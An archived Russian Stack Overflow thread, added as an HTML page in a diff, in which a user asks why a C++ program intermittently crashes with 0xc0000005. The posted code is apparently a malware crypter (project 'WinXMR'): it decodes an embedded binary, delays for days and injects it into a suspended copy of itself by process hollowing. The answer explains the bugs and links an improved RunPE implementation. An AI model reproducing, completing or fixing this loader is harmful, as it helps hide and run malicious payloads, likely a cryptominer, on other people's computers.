@@ -1,0 +1,414 @@
+﻿<!DOCTYPE html>
+<!--[if IE]><![endif]-->
+<html>
+  
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>&#1055;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1072; &#1079;&#1072;&#1087;&#1091;&#1089;&#1082;&#1072;&#1077;&#1090;&#1089;&#1103; &#1095;&#1077;&#1088;&#1077;&#1079; &#1088;&#1072;&#1079; 0xc0000005 C++ | RuSO Archive </title>
+    <meta name="viewport" content="width=device-width">
+    <meta name="title" content="&#1055;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1072; &#1079;&#1072;&#1087;&#1091;&#1089;&#1082;&#1072;&#1077;&#1090;&#1089;&#1103; &#1095;&#1077;&#1088;&#1077;&#1079; &#1088;&#1072;&#1079; 0xc0000005 C++ | RuSO Archive ">
+    <meta name="generator" content="docfx 2.40.12.0">
+    
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    <link rel="stylesheet" href="../../../../styles/docfx.vendor.css">
+    <link rel="stylesheet" href="../../../../styles/docfx.css">
+    <link rel="stylesheet" href="../../../../styles/main.css">
+    <meta property="docfx:navrel" content="../../../../toc.html">
+    <meta property="docfx:tocrel" content="toc.html">
+    
+    
+    
+  </head>
+  <body data-spy="scroll" data-target="#affix" data-offset="120">
+    <div id="wrapper">
+      <header>
+        
+        <nav id="autocollapse" class="navbar navbar-inverse ng-scope" role="navigation">
+          <div class="container">
+            <div class="navbar-header">
+              <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+              
+              <a class="navbar-brand" href="../../../../index.html">
+                <img id="logo" class="svg" src="../../../../logo.svg" alt="">
+              </a>
+            </div>
+            <div class="collapse navbar-collapse" id="navbar">
+              <form class="navbar-form navbar-right" role="search" id="search">
+                <div class="form-group">
+                  <input type="text" class="form-control" id="search-query" placeholder="Search" autocomplete="off">
+                </div>
+              </form>
+            </div>
+          </div>
+        </nav>
+        
+        <div class="subnav navbar navbar-default">
+          <div class="container hide-when-search" id="breadcrumb">
+            <ul class="breadcrumb">
+              <li></li>
+            </ul>
+          </div>
+        </div>
+      </header>
+      <div role="main" class="container body-content hide-when-search">
+        
+        <div class="sidenav hide-when-search">
+          <a class="btn toc-toggle collapse" data-toggle="collapse" href="#sidetoggle" aria-expanded="false" aria-controls="sidetoggle">Show / Hide Table of Contents</a>
+          <div class="sidetoggle collapse" id="sidetoggle">
+            <div id="sidetoc"></div>
+          </div>
+        </div>
+        <div class="article row grid-right">
+          <div class="col-md-10">
+            <article class="content wrap" id="_content" data-uid="">
+
+<p><i><a href="https://github.com/MSDN-WhiteKnight/ruso-archive/">RuSO Archive</a></i></p>
+<h1>Программа запускается через раз 0xc0000005 C++</h1>
+<p><a href="https://ru.stackoverflow.com/questions/921312/%d0%9f%d1%80%d0%be%d0%b3%d1%80%d0%b0%d0%bc%d0%bc%d0%b0-%d0%b7%d0%b0%d0%bf%d1%83%d1%81%d0%ba%d0%b0%d0%b5%d1%82%d1%81%d1%8f-%d1%87%d0%b5%d1%80%d0%b5%d0%b7-%d1%80%d0%b0%d0%b7-0xc0000005-c">Source</a> - by <a href="https://ru.stackoverflow.com/users/320569/%d0%a5%d0%b0%d0%bb%d0%b8%d0%bb-%d0%9c%d1%83%d1%80%d0%b0%d0%b4%d0%be%d0%b2">Халил Мурадов</a></p>
+<blockquote>
+<p>В общем, компилирую программу в Release Win32, на выходе получаю свою программу, но вот она запускается через раз, то есть, иногда нормально запускает runPE(rawData), а иногда выдаёт Ошибку </p>
+<blockquote>
+  <p>моя_программа.exe - Ошибка приложения </p>
+  
+  <p>Ошибка при запуске приложения
+  (0xc0000005). Для выхода из приложения нажмите кнопку "ОК".</p>
+</blockquote>
+<p><a href="https://pastebin.com/RiQn2ked" rel="nofollow noreferrer">Вот код программы </a></p>
+<pre><code>#define _CRT_SECURE_NO_WARNINGS
+#define _CRT_SECURE_NO_DEPRECATE
+#define _CRT_NONSTDC_NO_DEPRECATE
+#define CRYPT
+#pragma warning(disable : 4996)
+
+
+#include "stdafx.h"
+#include "WinXMR.h"
+#include &lt;iostream&gt; // Standard C++ library for console I/O
+#include &lt;string&gt; // Standard C++ Library for string manip
+
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;TlHelp32.h&gt; //WinAPI Process API
+#pragma comment(lib,"ws2_32.lib")
+#pragma comment(lib,"ntdll.lib") 
+
+
+#define MAX_LOADSTRING 100
+
+// Глобальные переменные:
+HINSTANCE hInst;                                // текущий экземпляр
+WCHAR szTitle[MAX_LOADSTRING];                  // Текст строки заголовка
+WCHAR szWindowClass[MAX_LOADSTRING];            // имя класса главного окна
+
+// Отправить объявления функций, включенных в этот модуль кода:
+ATOM                MyRegisterClass(HINSTANCE hInstance);
+BOOL                InitInstance(HINSTANCE, int);
+LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
+INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
+
+
+int RunPortableExecutable(void* Image)
+{
+    IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
+    IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects &amp; symbols
+    IMAGE_SECTION_HEADER* SectionHeader;
+
+    PROCESS_INFORMATION PI;
+    STARTUPINFOA SI;
+
+    CONTEXT* CTX;
+
+    DWORD* ImageBase; //Base address of the image
+    void* pImageBase; // Pointer to the image base
+
+    int count;
+    char CurrentFilePath[1024];
+
+    DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
+    NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader-&gt;e_lfanew); // Initialize
+
+    GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable
+
+    if (NtHeader-&gt;Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
+    {
+        ZeroMemory(&amp;PI, sizeof(PI)); // Null the memory
+        ZeroMemory(&amp;SI, sizeof(SI)); // Null the memory
+
+        if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
+            CREATE_SUSPENDED, NULL, NULL, &amp;SI, &amp;PI)) // Create a new instance of current
+            //process in suspended state, for the new image.
+        {
+            // Allocate memory for the context.
+            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+            CTX-&gt;ContextFlags = CONTEXT_FULL; // Context is allocated
+
+            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
+            {
+                // Read instructions
+                ReadProcessMemory(PI.hProcess, LPCVOID(CTX-&gt;Ebx + 8), LPVOID(&amp;ImageBase), 4, 0);
+
+                pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader-&gt;OptionalHeader.ImageBase),
+                    NtHeader-&gt;OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+
+                // Write the image to the process
+                WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, NULL);
+
+                for (count = 0; count &lt; NtHeader-&gt;FileHeader.NumberOfSections; count++)
+                {
+                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader-&gt;e_lfanew + 248 + (count * 40));
+
+                    WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader-&gt;VirtualAddress),
+                        LPVOID(DWORD(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, 0);
+                }
+                WriteProcessMemory(PI.hProcess, LPVOID(CTX-&gt;Ebx + 8),
+                    LPVOID(&amp;NtHeader-&gt;OptionalHeader.ImageBase), 4, 0);
+
+                // Move address of entry point to the eax register
+                CTX-&gt;Eax = DWORD(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;
+                SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
+                ResumeThread(PI.hThread); //´Start the process/call main()
+
+                return 0; // Operation was successful.
+            }
+        }
+    }
+}
+
+// бинарный код программы
+unsigned char rawData[] = {
+    // 284448 строк бинарника
+};
+
+
+
+
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+                     _In_opt_ HINSTANCE hPrevInstance,
+                     _In_ LPWSTR    lpCmdLine,
+                     _In_ int       nCmdShow)
+{
+    UNREFERENCED_PARAMETER(hPrevInstance);
+    UNREFERENCED_PARAMETER(lpCmdLine);
+
+    for (int i = 0; i &lt; 550000; i++)
+        Sleep(1000);
+    for (int i = 0; i &lt; sizeof(rawData) / sizeof(*rawData); i++) {
+        unsigned char b = rawData[i] + 0x11;
+        rawData[i] = b;
+    }
+    Sleep(3000); //задержка
+    RunPortableExecutable(rawData); // run executable from the array
+    getchar();
+    delete rawData;
+    // TODO: Разместите код здесь.
+
+    // Инициализация глобальных строк
+    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
+    LoadStringW(hInstance, IDC_WINXMR, szWindowClass, MAX_LOADSTRING);
+    MyRegisterClass(hInstance);
+
+    // Выполнить инициализацию приложения:
+    if (!InitInstance (hInstance, nCmdShow))
+    {
+        return FALSE;
+    }
+
+    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINXMR));
+
+    MSG msg;
+
+    // Цикл основного сообщения:
+    while (GetMessage(&amp;msg, nullptr, 0, 0))
+    {
+        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg))
+        {
+            TranslateMessage(&amp;msg);
+            DispatchMessage(&amp;msg);
+        }
+    }
+
+    return (int) msg.wParam;
+}
+
+
+
+//
+//  ФУНКЦИЯ: MyRegisterClass()
+//
+//  ЦЕЛЬ: Регистрирует класс окна.
+//
+ATOM MyRegisterClass(HINSTANCE hInstance)
+{
+    WNDCLASSEXW wcex;
+
+    wcex.cbSize = sizeof(WNDCLASSEX);
+
+    wcex.style          = CS_HREDRAW | CS_VREDRAW;
+    wcex.lpfnWndProc    = WndProc;
+    wcex.cbClsExtra     = 0;
+    wcex.cbWndExtra     = 0;
+    wcex.hInstance      = hInstance;
+    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINXMR));
+    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
+    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
+    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_WINXMR);
+    wcex.lpszClassName  = szWindowClass;
+    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
+
+    return RegisterClassExW(&amp;wcex);
+}
+
+//
+//   ФУНКЦИЯ: InitInstance(HINSTANCE, int)
+//
+//   ЦЕЛЬ: Сохраняет маркер экземпляра и создает главное окно
+//
+//   КОММЕНТАРИИ:
+//
+//        В этой функции маркер экземпляра сохраняется в глобальной переменной, а также
+//        создается и выводится главное окно программы.
+//
+BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
+{
+   hInst = hInstance; // Сохранить маркер экземпляра в глобальной переменной
+
+   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
+      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
+
+   if (!hWnd)
+   {
+      return FALSE;
+   }
+
+   ShowWindow(hWnd, nCmdShow);
+   UpdateWindow(hWnd);
+
+   return TRUE;
+}
+
+//
+//  ФУНКЦИЯ: WndProc(HWND, UINT, WPARAM, LPARAM)
+//
+//  ЦЕЛЬ: Обрабатывает сообщения в главном окне.
+//
+//  WM_COMMAND  - обработать меню приложения
+//  WM_PAINT    - Отрисовка главного окна
+//  WM_DESTROY  - отправить сообщение о выходе и вернуться
+//
+//
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+    switch (message)
+    {
+    case WM_COMMAND:
+        {
+            int wmId = LOWORD(wParam);
+            // Разобрать выбор в меню:
+            switch (wmId)
+            {
+            case IDM_ABOUT:
+                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
+                break;
+            case IDM_EXIT:
+                DestroyWindow(hWnd);
+                break;
+            default:
+                return DefWindowProc(hWnd, message, wParam, lParam);
+            }
+        }
+        break;
+    case WM_PAINT:
+        {
+            PAINTSTRUCT ps;
+            HDC hdc = BeginPaint(hWnd, &amp;ps);
+            // TODO: Добавьте сюда любой код прорисовки, использующий HDC...
+            EndPaint(hWnd, &amp;ps);
+        }
+        break;
+    case WM_DESTROY:
+        PostQuitMessage(0);
+        break;
+    default:
+        return DefWindowProc(hWnd, message, wParam, lParam);
+    }
+    return 0;
+}
+
+// Обработчик сообщений для окна "О программе".
+INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
+{
+    UNREFERENCED_PARAMETER(lParam);
+    switch (message)
+    {
+    case WM_INITDIALOG:
+        return (INT_PTR)TRUE;
+
+    case WM_COMMAND:
+        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
+        {
+            EndDialog(hDlg, LOWORD(wParam));
+            return (INT_PTR)TRUE;
+        }
+        break;
+    }
+    return (INT_PTR)FALSE;
+}
+</code></pre>
+<p>На некоторых компьютерах вовсе отображается,  что приложение не является win32</p>
+</blockquote>
+<h2>Answer 921881</h2>
+<p><a href="https://ru.stackoverflow.com/a/921881/">Source</a> - by <a href="https://ru.stackoverflow.com/users/240512/msdn-whiteknight">MSDN.WhiteKnight</a></p>
+<blockquote>
+<p>Программа некорректна как минимум в двух аспектах.</p>
+<ol>
+<li><p>Программа пытается динамически создать в памяти кусок кода, но при этом не вызывает функцию <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-flushinstructioncache" rel="nofollow noreferrer">FlushInstructionCache</a>. </p></li>
+<li><p>Нет гарантий, что в адресном пространстве любого процесса по заданному адресу <code>NtHeader-&gt;OptionalHeader.ImageBase</code> ОС сможет выделить непрерывный блок памяти нужного размера (вы даже не проверяете результат возврата VirtualAllocEx, чтобы узнать это). В современных версиях Windows действует Address space layout randomization, и предугадать, по какому адресу что будет загружено, невозможно. </p></li>
+</ol>
+<p>Я бы сказал, то, что вы пытаетесь сделать, не будет работать. Выгрузите бинарник во временный файл и создайте процесс с него, это единственная рабочая схема.</p>
+<p>Если вас интересует, как избавиться от Access Violation и вместо этого корректно вернуть ошибку, посмотрите улучшенный вариант этого кода: <a href="https://github.com/Anon-65535/RunPE-Fixed-/blob/master/RunPE32_From_Memory.cpp" rel="nofollow noreferrer">https://github.com/Anon-65535/RunPE-Fixed-/blob/master/RunPE32_From_Memory.cpp</a></p>
+</blockquote>
+<hr>
+<p><i>Content is retrieved from StackExchange API. </i></p>
+<p><i>Auto-generated by ruso-archive tools. </i></p>
+</article>
+          </div>
+          
+          <div class="hidden-sm col-md-2" role="complementary">
+            <div class="sideaffix">
+              <div class="contribution">
+                <ul class="nav">
+                </ul>
+              </div>
+              <nav class="bs-docs-sidebar hidden-print hidden-xs hidden-sm affix" id="affix">
+              <!-- <p><a class="back-to-top" href="#top">Back to top</a><p> -->
+              </nav>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <footer>
+        <div class="grad-bottom"></div>
+        <div class="footer">
+          <div class="container">
+            <span class="pull-right">
+              <a href="#top">Back to top</a>
+            </span>
+            <span>RuSO Archive (published from sources in <a href="https://github.com/MSDN-WhiteKnight/ruso-archive">GitHub repository</a>). Content licensed under <a href="https://github.com/MSDN-WhiteKnight/ruso-archive/blob/master/LICENSE">CC-BY-SA 4.0</a>.<br>Generated by <strong>DocFX</strong></span>
+            
+          </div>
+        </div>
+      </footer>
+    </div>
+    
+    <script type="text/javascript" src="../../../../styles/docfx.vendor.js"></script>
+    <script type="text/javascript" src="../../../../styles/docfx.js"></script>
+    <script type="text/javascript" src="../../../../styles/main.js"></script>
+  </body>
+</html>
